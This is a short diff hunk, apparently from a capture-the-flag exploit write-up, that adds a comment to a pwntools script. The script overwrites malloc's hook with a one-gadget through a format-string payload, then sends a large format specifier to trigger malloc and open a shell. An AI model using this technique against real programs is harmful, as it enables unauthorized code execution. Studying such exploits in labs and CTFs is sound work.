@@ -331,6 +331,7 @@ malloc = libc.address + 0x3ebc30
 payload = fmtstr_payload(format_strings.offset, {malloc:one_gadget})
 sh.sendline(payload)
 sh.sendline(b'%100000s') # GOT RCE AT 100000s. | or you can just send %1000000c --> Since we're sending big buffer, it shall trigger malloc usage.
+# Forcing libc to allocate space on the heap.
 
 sh.interactive()
 ```
